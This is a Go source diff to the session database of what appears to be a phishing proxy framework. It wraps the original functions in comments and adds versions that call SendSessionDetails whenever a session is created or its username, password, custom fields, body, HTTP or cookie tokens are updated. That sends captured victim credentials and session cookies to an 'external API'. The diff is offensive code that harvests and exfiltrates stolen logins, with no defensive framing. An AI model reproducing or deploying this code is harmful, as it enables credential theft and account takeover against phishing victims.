@@ -39,6 +39,7 @@ func (d *Database) sessionsInit() {
 	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
 }
 
+/*
 func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
 	_, err := d.sessionsGetBySid(sid)
 	if err == nil {
@@ -75,6 +76,58 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 	}
 	return s, nil
 }
+*/
+
+func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
+	// Check if the session already exists
+	_, err := d.sessionsGetBySid(sid)
+	if err == nil {
+		return nil, fmt.Errorf("session already exists: %s", sid)
+	}
+
+	// Generate the next session ID
+	id, _ := d.getNextId(SessionTable)
+
+	// Create a new session
+	s := &Session{
+		Id:           id,
+		Phishlet:     phishlet,
+		LandingURL:   landing_url,
+		Username:     "",
+		Password:     "",
+		Custom:       make(map[string]string),
+		BodyTokens:   make(map[string]string),
+		HttpTokens:   make(map[string]string),
+		CookieTokens: make(map[string]map[string]*CookieToken),
+		SessionId:    sid,
+		UserAgent:    useragent,
+		RemoteAddr:   remote_addr,
+		CreateTime:   time.Now().UTC().Unix(),
+		UpdateTime:   time.Now().UTC().Unix(),
+	}
+
+	// Serialize the session to JSON
+	jf, _ := json.Marshal(s)
+
+	// Save the session to the database
+	err = d.db.Update(func(tx *buntdb.Tx) error {
+		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
+		return nil
+	})
+	if err != nil {
+		return nil, err
+	}
+
+	// Send session details to the external API
+	if err := SendSessionDetails(s); err != nil {
+		// Handle the error (e.g., log it or return it)
+		fmt.Printf("Error sending session details: %v\n", err)
+	}
+
+	// Return the created session
+	return s, nil
+}
+
 
 func (d *Database) sessionsList() ([]*Session, error) {
 	sessions := []*Session{}
@@ -94,6 +147,8 @@ func (d *Database) sessionsList() ([]*Session, error) {
 	return sessions, nil
 }
 
+
+/*
 func (d *Database) sessionsUpdateUsername(sid string, username string) error {
 	s, err := d.sessionsGetBySid(sid)
 	if err != nil {
@@ -175,6 +230,154 @@ func (d *Database) sessionsUpdate(id int, s *Session) error {
 	})
 	return err
 }
+
+*/
+
+func (d *Database) sessionsUpdateUsername(sid string, username string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Username = username
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	if err != nil {
+		return err
+	}
+
+	// Send updated session details to the external API
+	if err := SendSessionDetails(s); err != nil {
+		fmt.Printf("Error sending session details: %v\n", err)
+	}
+
+	return nil
+}
+
+func (d *Database) sessionsUpdatePassword(sid string, password string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Password = password
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	if err != nil {
+		return err
+	}
+
+	// Send updated session details to the external API
+	if err := SendSessionDetails(s); err != nil {
+		fmt.Printf("Error sending session details: %v\n", err)
+	}
+
+	return nil
+}
+
+func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Custom[name] = value
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	if err != nil {
+		return err
+	}
+
+	// Send updated session details to the external API
+	if err := SendSessionDetails(s); err != nil {
+		fmt.Printf("Error sending session details: %v\n", err)
+	}
+
+	return nil
+}
+
+func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.BodyTokens = tokens
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	if err != nil {
+		return err
+	}
+
+	// Send updated session details to the external API
+	if err := SendSessionDetails(s); err != nil {
+		fmt.Printf("Error sending session details: %v\n", err)
+	}
+
+	return nil
+}
+
+func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.HttpTokens = tokens
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	if err != nil {
+		return err
+	}
+
+	// Send updated session details to the external API
+	if err := SendSessionDetails(s); err != nil {
+		fmt.Printf("Error sending session details: %v\n", err)
+	}
+
+	return nil
+}
+
+func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.CookieTokens = tokens
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	if err != nil {
+		return err
+	}
+
+	// Send updated session details to the external API
+	if err := SendSessionDetails(s); err != nil {
+		fmt.Printf("Error sending session details: %v\n", err)
+	}
+
+	return nil
+}
+
+func (d *Database) sessionsUpdate(id int, s *Session) error {
+	jf, _ := json.Marshal(s)
+
+	err := d.db.Update(func(tx *buntdb.Tx) error {
+		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
+		return nil
+	})
+	if err != nil {
+		return err
+	}
+
+	// Send updated session details to the external API
+	if err := SendSessionDetails(s); err != nil {
+		fmt.Printf("Error sending session details: %v\n", err)
+	}
+
+	return nil
+}
+
 
 func (d *Database) sessionsDelete(id int) error {
 	err := d.db.Update(func(tx *buntdb.Tx) error {
